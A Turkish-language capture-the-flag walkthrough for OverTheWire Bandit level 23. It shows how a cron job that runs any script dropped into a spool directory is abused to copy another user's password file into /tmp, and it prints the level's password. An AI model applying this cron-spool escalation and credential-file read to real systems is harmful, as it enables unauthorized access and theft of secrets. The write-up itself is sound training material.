# Bandit Over The Wire **23**
### Bu Leveldeki Amacımız
> SSH kullanarak bandit23 bağlanıp bir önceki level gibi `cron` ile tekrarlanan bir işlemi inceleyerek şifrenin yerini bulmak ve bir sonraki level için şifreyi bulmak.

## Kullanacağımız Komutlar
1. `ls` : Bulunduğumuz dizindeki dosyaları listeler. Bir çok parametresi bulunuyor. Bu parametreler sayesinde dosyaları farklı şekillerde listelememizi sağlıyor. Daha fazlası için `man ls` komutunu kullanabilirsiniz.
2. `cat`: Bir dosya içeriğini ekrana yazdırır. Daha fazlası için `man cat` komutunu kullanabilirsiniz.
3. `cd`: Change Directory kısaltmasıdır. Bulunduğumuz dizini değiştirmemizi sağlar. Daha fazlası için `man cd` komutunu kullanabilirsiniz.
4. `touch` : Bir dosya oluşturur. Daha fazlası için `man touch` komutunu kullanabilirsiniz.
5. `chmod` : Bir dosyanın izinlerini değiştirmemizi sağlar. Daha fazlası için `man chmod` komutunu kullanabilirsiniz.
7. `nano`: Terminal üzerinde bir metin editörüdür. Daha fazlası için `man nano` komutunu kullanabilirsiniz.

## Şifre Bulma
Bir ve iki önceki leveldeki gibi `cron.d` dosyası var ve içinde çalıştırdı bir shell dosyası bulunuyor bunlara teker teker bakalım.

```bash
bandit23@bandit:~$ ls -a /etc/cron.d/  
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
```
```bash
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```
```bash
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

Burada `cronjob_bandit24.sh` dosyasının her dakika çalıştığını görebiliriz. `cronjob_bandit24.sh` dosyasını incelediğimizde `/var/spool/$myname/foo` dizinine gidip içindeki dosyaları çalıştırdığını ve daha sonra sildiğini görebiliriz. Bizim amacımız `/var/spool/$myname/foo` altına bir `shell script` hazırlamak ve bu çalıştığı zamanda bir sonraki levelin şifresini elde etmek.

Burada `$myname` bizim kullnaıcı ismimiz oluyor yani `bandit23`

```bash
bandit23@bandit:~$ touch /var/spool/bandit24/foo/bandit25sa.sh
bandit23@bandit:~$ nano /var/spool/bandit24/foo/bandit25sa.sh
```
Burada nano ile açtığımız dosyanın içine şu kodu yazıyoruz.
```bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24kolaydi.txt
chmod 444 /tmp/bandit24kolaydi.txt
```
Daha sonra `cronjob_bandit24.sh` dosyasını inceleyip içindeki kodu anlamaya çalışıyoruz. Burada `timeout` komutu ile 60 saniye içinde `bandit25sa.sh` dosyasını çalıştırıp daha sonra siliyor. Bizim amacımız bu dosyayı çalıştırdığında `/tmp` dizinine `bandit24kolaydi.txt` dosyasını oluşturup içine şifreyi yazdırmak ve daha sonra da izinlerini değiştirmek.

```bash
bandit23@bandit:~$ cat /tmp/bandit24kolaydi.txt
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

Şifremizi elde ettik. Bir sonraki levele geçebiliriz.

<hr/>

Hata ve geri dönüşler için: *[ersagun@ersaguntosun.com ](mailto:ersagun@ersaguntosun.com)*


